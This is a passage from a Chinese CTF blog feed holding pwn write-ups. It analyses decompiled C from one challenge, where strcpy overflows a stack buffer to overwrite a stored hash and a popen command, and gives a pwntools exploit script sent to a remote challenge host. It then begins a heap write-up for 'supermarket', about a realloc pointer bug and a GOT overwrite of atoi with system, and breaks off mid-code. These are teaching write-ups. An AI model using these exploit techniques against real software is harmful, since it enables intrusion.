BYREF</span><span class="token keyword">char</span> dest<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-2F8h] BYREF</span><span class="token keyword">char</span> command<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+110h] [rbp-1F8h] BYREF</span><span class="token keyword">char</span> hash_value<span class="token punctuation">[</span><span class="token number">65</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+12Bh] [rbp-1DDh] BYREF</span>_QWORD v16<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+16Ch] [rbp-19Ch] BYREF</span><span class="token keyword">char</span> v17<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+18Ch] [rbp-17Ch] BYREF</span><span class="token keyword">int</span> v18<span class="token punctuation">;</span> <span class="token comment">// [rsp+1CCh] [rbp-13Ch] BYREF</span><span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">264</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+1D0h] [rbp-138h] BYREF</span><span class="token keyword">unsigned</span> __int64 v20<span class="token punctuation">;</span> <span class="token comment">// [rsp+2D8h] [rbp-30h]</span>v20 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">sub_5593A2200E60</span><span class="token punctuation">(</span>dest<span class="token punctuation">)</span><span class="token punctuation">;</span>                       <span class="token comment">// 通过dest加偏移的方式初始化command和hash_value</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在<code>sub_5593A2200E60(dest)</code>函数中看一下，参数<code>a1</code>就是<code>dest</code>，通过<code>dest+偏移</code>的方式将数据分别写入到了command和hash_value中。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">sub_5593A2200E60</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>a1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> v2<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-78h] BYREF</span>  <span class="token keyword">char</span> v3<span class="token punctuation">[</span><span class="token number">72</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+20h] [rbp-58h] BYREF</span>  <span class="token keyword">unsigned</span> __int64 v4<span class="token punctuation">;</span> <span class="token comment">// [rsp+68h] [rbp-10h]</span>  v4 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x100uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">strcpy</span><span class="token punctuation">(</span>v2<span class="token punctuation">,</span> <span class="token string">"/bin/cat ./secret_data.asc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">snprintf</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">256</span><span class="token punctuation">,</span> <span class="token number">27uLL</span><span class="token punctuation">,</span> <span class="token string">"%s"</span><span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment">// 写入到 command中</span>  <span class="token function">strcpy</span><span class="token punctuation">(</span>v3<span class="token punctuation">,</span> <span class="token string">"9387a00e31e413c55af9c08c69cd119ab4685ef3bc8bcbe1cf82161119457127"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">snprintf</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">283</span><span class="token punctuation">,</span> <span class="token number">65uLL</span><span class="token punctuation">,</span> <span class="token string">"%s"</span><span class="token punctuation">,</span> v3<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment">// 写入到 hashvalue中</span>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v4<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过getline读取输入写入到lineptr中，之后又将lineptr通过strcpy函数复制到dest中，然后计算dest前0x100个字符的hash值，</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">v11 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  lineptr <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">getline</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>lineptr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v11<span class="token punctuation">,</span> MEMORY<span class="token punctuation">[</span><span class="token number">0x7FE33FA41870</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>  v3 <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span>lineptr<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v3 <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token operator">*</span>v3 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  v4 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8 <span class="token operator">*</span><span class="token punctuation">)</span>v16<span class="token punctuation">;</span>                  <span class="token comment">//v4 = v16</span>  v5 <span class="token operator">=</span> v17<span class="token punctuation">;</span>                                     <span class="token comment">// char *类型，对v5的操作直接对v7生效</span>  <span class="token function">strcpy</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> lineptr<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token comment">// 通过strcpy函数覆盖dest处的值</span>  <span class="token function">sub_5593A2200DD0</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>dest<span class="token punctuation">,</span> v16<span class="token punctuation">,</span> <span class="token number">0x100u</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 计算dest前0x100个字符的hash值</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过do-while将输入的字符计算hash值后写入到v17中然后通过strcmp函数与初始化的hash_value进行比较，若相等，则会执行popen()函数来执行command初始化的命令。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">do</span> <span class="token punctuation">&#123;</span>   v6 <span class="token operator">=</span> <span class="token operator">*</span>v4<span class="token punctuation">;</span>   v7 <span class="token operator">=</span> v5<span class="token punctuation">;</span>   v5 <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">;</span>   <span class="token operator">++</span>v4<span class="token punctuation">;</span>   <span class="token function">snprintf</span><span class="token punctuation">(</span>v7<span class="token punctuation">,</span> <span class="token number">3uLL</span><span class="token punctuation">,</span> <span class="token string">"%02x"</span><span class="token punctuation">,</span> v6<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span> v5 <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v18 <span class="token punctuation">)</span><span class="token punctuation">;</span> v8 <span class="token operator">=</span> <span class="token function">strcmp</span><span class="token punctuation">(</span>hash_value<span class="token punctuation">,</span> v17<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> v8 <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"wrong password!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> v9 <span class="token operator">=</span> <span class="token function">popen</span><span class="token punctuation">(</span>command<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v9 <span class="token punctuation">)</span>   <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token function">fgets</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">,</span> v9<span class="token punctuation">)</span> <span class="token punctuation">)</span>   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">fclose</span><span class="token punctuation">(</span>v9<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">return</span> v8<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>hash值碰撞不出来，但是可以通过strcmp去覆盖初始化的hash值为我们要输入数据的hash值，将command覆盖为我们想要的命令（栈中是连续的）</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">import</span> hashlibcontext<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token builtin">file</span> <span class="token operator">=</span> <span class="token string">'./secret'</span>ip <span class="token operator">=</span> <span class="token string">'61.147.171.105'</span>port <span class="token operator">=</span> <span class="token number">64902</span>status <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> status <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span>value <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span><span class="token punctuation">)</span>value<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'1'</span><span class="token operator">*</span><span class="token number">256</span><span class="token punctuation">)</span>value1 <span class="token operator">=</span> value<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">(</span>value1<span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'1'</span><span class="token operator">*</span><span class="token number">256</span> <span class="token operator">+</span> <span class="token string">b'cat ./flag.txt;'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x1b</span><span class="token punctuation">,</span> <span class="token string">b' '</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'bd93b4a63868f8c6028d3fa30bdb4f2c15b96e2ec6ac85acfa7bac4b40c4c683'</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界pwn-supermarket</title>
      <link href="/ctf-pwn/308238d8.html"/>
      <url>/ctf-pwn/308238d8.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>打开时间比完成时间早太久了</p><p>堆的基础知识需要补</p></blockquote><p><a href="https://zoepla.github.io/2018/05/ciscn-supermarket/">国赛pwn supermarket (zoepla.github.io)</a><br><a href="https://blog.csdn.net/seaaseesa/article/details/103093182">攻防世界PWN之Supermarket题解_攻防世界supermarket-CSDN博客</a></p><p><code>realloc</code>之后没有返回新的指针<br>程序运行之后显示一个菜单，可以增删改查。<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20240724140238.png" alt="image.png"></p><p>在IDA中打开分析，跟进到主函数中，通过switchcase结构实现菜单，使用atoi函数将输入的字符转换为数字。（这个函数比较重要，通过将atoi函数got表地址修改为system地址来getshell）</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __noreturn <span class="token function">sub_8048FC1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>                                     <span class="token punctuation">&#123;</span>    <span class="token function">sub_8048864</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"your choice>> "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span> <span class="token function">get_number</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token comment">//通过atoi函数将字符转换为数字</span>    <span class="token punctuation">&#123;</span>      <span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span>        <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>        <span class="token function">del</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">3</span><span class="token operator">:</span>        <span class="token function">show_list</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">4</span><span class="token operator">:</span>        <span class="token function">change_price</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">5</span><span class="token operator">:</span>        <span class="token function">change_des</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">6</span><span class="token operator">:</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>      <span class="token keyword">default</span><span class="token operator">:</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"invalid choice"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>跟进到add函数中,在对add函数分析中发现，商品信息是一个0x1C大小的结构</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  commodity <span class="token operator">*</span>value<span class="token punctuation">;</span> <span class="token comment">// ebx</span>  commodity <span class="token operator">*</span>v2<span class="token punctuation">;</span> <span class="token comment">// ebx</span>  <span class="token keyword">char</span> name<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+4h] [ebp-24h] BYREF</span>  <span class="token keyword">int</span> price<span class="token punctuation">;</span> <span class="token comment">// [esp+14h] [ebp-14h]</span>  <span class="token keyword">int</span> index<span class="token punctuation">;</span> <span class="token comment">// [esp+18h] [ebp-10h]</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [esp+1Ch] [ebp-Ch]</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">15</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span>s2<span class="token punctuation">)</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    <span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> i <span class="token operator">></span> <span class="token number">15</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"no more space"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"name:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">au_re__read_0</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>name<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token comment">// 输入name</span>  index <span class="token operator">=</span> <span class="token function">au_re__strcmp</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token comment">// 检查是否已存在</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> index <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"name exist"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  index <span class="token operator">=</span> <span class="token function">sub_8048D95</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token comment">// 检查队列是否已满</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> index <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"no more space"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">(</span><span class="token operator">&amp;</span>s2<span class="token punctuation">)</span><span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x1Cu</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">// 给元素申请空间</span>  <span class="token function">strcpy</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s2<span class="token punctuation">)</span><span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"name:%s\n"</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>  price <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"price:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  price <span class="token operator">=</span> <span class="token function">get_number</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"price:%d\n"</span><span class="token punctuation">,</span> price<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> price <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> price <span class="token operator">&lt;=</span> <span class="token number">999</span> <span class="token punctuation">)</span>              <span class="token comment">// 规定price的范围</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s2<span class="token punctuation">)</span><span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">=</span> price<span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s2<span class="token punctuation">)</span><span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s2<span class="token punctuation">)</span><span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s2<span class="token punctuation">)</span><span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">256</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"descrip_size:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    value <span class="token operator">=</span> <span class="token punctuation">(</span>commodity <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s2<span class="token punctuation">)</span><span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">;</span>    value<span class="token operator">-></span>des_size <span class="token operator">=</span> <span class="token function">get_number</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//给descrip要分配空间的大小</span>  <span class="token punctuation">&#125;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"descrip_size:%d\n"</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s2<span class="token punctuation">)</span><span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v2 <span class="token operator">=</span> <span class="token punctuation">(</span>commodity <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s2<span class="token punctuation">)</span><span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">;</span>  v2<span class="token operator">-></span>des <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>v2<span class="token operator">-></span>des_size<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//给descrip申请空间</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"description:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">au_re__read_0</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s2<span class="token punctuation">)</span><span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s2<span class="token punctuation">)</span><span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>商品信息结构体：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">node</span> <span class="token punctuation">&#123;</span><span class="token keyword">char</span> name<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> price<span class="token punctuation">;</span><span class="token keyword">int</span> des_size<span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>description<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>重点在change_des函数中，在该函数中使用了realloc函数来修改des空间的大小。<br>realloc函数在修改堆空间大小，如果比原来的堆大，就会重新申请一块空间并将原来的数据复制过去，旧的堆块自动free掉；如果比原的堆小，就会复用原堆，并将多于空间free掉，那一部分数据也会被抛弃。<br>且在realloc后并没有将返回的指针重新赋值给des，也是就说des还是指向原来的空间。<br>再修改new_des的内容还是操作的原来那片空间</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">change_des</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> name_index<span class="token punctuation">;</span> <span class="token comment">// [esp+8h] [ebp-10h]</span>  <span class="token keyword">int</span> size<span class="token punctuation">;</span> <span class="token comment">// [esp+Ch] [ebp-Ch]</span>  name_index <span class="token operator">=</span> <span class="token function">get_name_index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> name_index <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"not exist"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> size <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> size <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token operator">||</span> size <span class="token operator">></span> <span class="token number">256</span><span class="token punctuation">;</span> size <span class="token operator">=</span> <span class="token function">get_number</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"descrip_size:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s2<span class="token punctuation">)</span><span class="token punctuation">[</span>name_index<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">!=</span> size <span class="token punctuation">)</span>    <span class="token function">realloc</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s2<span class="token punctuation">)</span><span class="token punctuation">[</span>name_index<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 返回后没有给原来的指针赋值</span>  